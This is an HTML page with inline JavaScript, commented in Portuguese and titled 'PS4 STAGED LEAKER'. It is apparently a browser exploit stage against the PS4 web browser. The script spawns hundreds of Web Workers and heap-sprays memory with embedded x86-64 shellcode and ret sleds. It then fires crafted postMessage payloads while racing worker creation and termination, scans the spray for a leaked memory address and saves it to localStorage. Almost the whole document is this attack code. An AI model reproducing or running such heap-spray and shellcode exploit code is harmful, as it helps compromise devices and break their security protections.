<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 STAGED LEAKER</title>
    <style>
        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
        h1 { color: #0ff; border-bottom: 1px solid #0ff; }
        .box { border: 1px solid #333; padding: 10px; margin: 10px auto; max-width: 600px; text-align: left; }
        .bar-container { background: #222; height: 20px; width: 100%; margin-top: 5px; }
        .bar { height: 100%; background: #0f0; width: 0%; transition: width 0.2s; }
        #log { height: 100px; overflow-y: scroll; border: 1px solid #444; font-size: 0.8em; margin-top: 20px; color: #aaa; text-align: left; padding: 5px; }
        #result { font-size: 2em; color: #ff0; font-weight: bold; display: none; margin-top: 20px; border: 2px solid #ff0; padding: 10px; }
    </style>
</head>
<body>

    <h1>STAGED LEAKER (UI FIX)</h1>

    <div class="box">
        <div>THREADS (Alvo: 417)</div>
        <div class="bar-container"><div id="bar-threads" class="bar"></div></div>
        <div id="txt-threads">0 / 417</div>
    </div>

    <div class="box">
        <div>MEMORY SPRAY (Alvo: 0x05...)</div>
        <div class="bar-container"><div id="bar-spray" class="bar" style="background:#00f"></div></div>
        <div id="txt-spray">Aguardando...</div>
    </div>

    <div id="result"></div>
    <div id="log">Logs do Sistema...</div>

    <script>
        // CONFIGURAÇÃO
        const SAFE_THREADS = 350;  // Para antes de travar
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        const ADDR_BYTE_3 = 0x05; // Alvo baixo (80MB)

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // SHELLCODE
        const code = new Uint8Array([
            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp] 
            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8]
            0x48, 0x89, 0x07,             // mov [rdi], rax
            0xC3,                         // ret
            0x00, 0x00, 0x00, 0x00,       // Slot Leitura
            0x00, 0x00, 0x00, 0x00        // Slot Leitura
        ]);
        const code32 = new Uint32Array(code.buffer);

        function log(msg) {
            const l = document.getElementById('log');
            l.innerHTML += `> ${msg}<br>`;
            l.scrollTop = l.scrollHeight;
        }

        // 1. SOBE THREADS ATÉ A ZONA SEGURA
        function stage1_SafeThreads() {
            log("Fase 1: Criando Threads Base...");
            let i = setInterval(() => {
                if (workers.length < SAFE_THREADS) {
                    workers.push(new Worker(url));
                    updateUI();
                } else {
                    clearInterval(i);
                    log("Base Pronta. Iniciando Spray Assíncrono...");
                    setTimeout(stage2_AsyncSpray, 500);
                }
            }, 20);
        }

        // 2. SPRAY ASSÍNCRONO (Não trava a tela)
        async function stage2_AsyncSpray() {
            const TOTAL_ARRAYS = 180; // ~70MB (Suficiente para 0x05)
            
            for(let i=0; i < TOTAL_ARRAYS; i++) {
                try {
                    let arr = new Uint32Array(0x4000); // 64KB
                    arr.fill(0xC3C3C3C3); // Preenche rápido
                    
                    // Injeta shellcode a cada 256 bytes
                    for(let k=0; k < arr.length; k+=64) {
                        arr.set(code32, k);
                    }
                    heapSpray.push(arr);
                    
                    // ATUALIZA UI
                    let pct = Math.floor((i / TOTAL_ARRAYS) * 100);
                    document.getElementById('bar-spray').style.width = `${pct}%`;
                    document.getElementById('txt-spray').innerText = `${i} / ${TOTAL_ARRAYS} Blocos`;

                    // RESPIRA (Deixa a UI atualizar)
                    if(i % 10 === 0) await new Promise(r => setTimeout(r, 0));

                } catch(e) {
                    log("OOM durante Spray. Parando aqui.");
                    break;
                }
            }
            
            document.getElementById('bar-spray').style.width = `100%`;
            log("Spray Concluído. Entrando na Zona de Perigo...");
            setTimeout(stage3_CriticalThreads, 1000);
        }

        // 3. SOBE PARA 417 (Gargalo)
        function stage3_CriticalThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                    updateUI();
                } else {
                    clearInterval(i);
                    log("ALVO ATINGIDO. PREPARANDO ATAQUE...");
                    // Scanner
                    setInterval(scan, 200);
                    // Ataque
                    setTimeout(attack, 1000);
                }
            }, 30); // Mais lento no final para não travar
        }

        function attack() {
            const st = document.getElementById('result');
            if(st.style.display === 'block') return;

            log(">>> ATIRANDO (HIT & RUN) <<<");
            
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3; // 0x05

            // Dispara por 3 segundos e para
            let count = 0;
            const atk = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { if(workers.length > 0) workers[0].postMessage(payload); } catch(e){}
                
                count++;
                if(count > 100) { // Para após ~2s
                     clearInterval(atk);
                     log("Tiros cessados. Aguardando leak...");
                     // Opcional: Matar threads aqui se der OOM
                }
            }, 20);
        }

        function scan() {
            for(let i=0; i<heapSpray.length; i+=2) { // Otimizado
                const arr = heapSpray[i];
                for(let k=0; k<arr.length; k+=64) {
                    let leakIdx = k + 4;
                    if(leakIdx < arr.length) {
                         if (arr[leakIdx] !== 0 && arr[leakIdx] !== 0) {
                            if(arr[leakIdx+1] !== 0) {
                                report(arr[leakIdx], arr[leakIdx+1]);
                                return;
                            }
                         }
                    }
                }
            }
        }

        function updateUI() {
            let pct = Math.floor((workers.length / TARGET_THREADS) * 100);
            document.getElementById('bar-threads').style.width = `${pct}%`;
            document.getElementById('txt-threads').innerText = `${workers.length} / ${TARGET_THREADS}`;
        }

        function report(low, high) {
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            const addr = `0x${hHigh}${hLow}`;
            
            document.getElementById('result').style.display = 'block';
            document.getElementById('result').innerText = addr;
            
            log(`SUCESSO! LEAK: ${addr}`);
            localStorage.setItem('ps4_leak', addr); // Salva

            // Limpeza
            workers.forEach(w => w.terminate());
            workers = [];
        }

        setTimeout(stage1_SafeThreads, 1000);

    </script>
</body>
</html>
